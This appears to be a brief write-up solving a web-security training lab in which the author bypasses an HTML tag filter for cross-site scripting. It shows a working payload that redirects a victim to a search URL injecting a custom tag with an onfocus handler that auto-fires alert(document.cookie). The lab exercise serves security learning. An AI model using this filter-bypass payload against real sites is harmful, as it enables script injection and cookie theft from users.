*This lab blocks all HTML tags except custom ones.
To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.*

Inserted the following payload that has a custom tag in my exploit:
```
<script>
location = 'https://0af3003c031bfb3987e749b200fc0013.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
![Screenshot 2024-05-15 at 1.39.52 PM](images/Screenshot%202024-05-15%20at%201.39.52%20PM.png)
This solves the lab!